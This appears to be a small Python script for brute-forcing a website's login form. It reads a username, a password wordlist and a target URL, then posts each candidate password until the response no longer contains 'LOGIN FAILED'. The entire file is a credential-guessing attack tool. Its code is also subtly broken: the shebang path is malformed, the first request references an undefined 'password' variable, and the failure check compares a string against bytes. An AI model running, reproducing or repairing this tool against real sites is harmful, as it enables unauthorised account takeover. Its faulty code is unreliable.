#!usr/bin/python3

import requests

username = input("Enter a username > ")
word_list = input("Enter your path to password list > ")
website = input("Enter the target website")

target_url = website
data_dict = {"username": username, "password": password, "Login": "submit"}
responce = requests.post(target_url, data=data_dict)

with open(word_list, "r") as wordlist_file:
	for line in wordlist_file:
		word = line.strip()
		data_dict["password"] = word
		responce = requests.post(target_url, data=data_dict)
		if "LOGIN FAILED" not in responce.content:
			print("[+] Got the password >>>" + word)
			exit()

print("[+] Finished Brute Forcing.....")


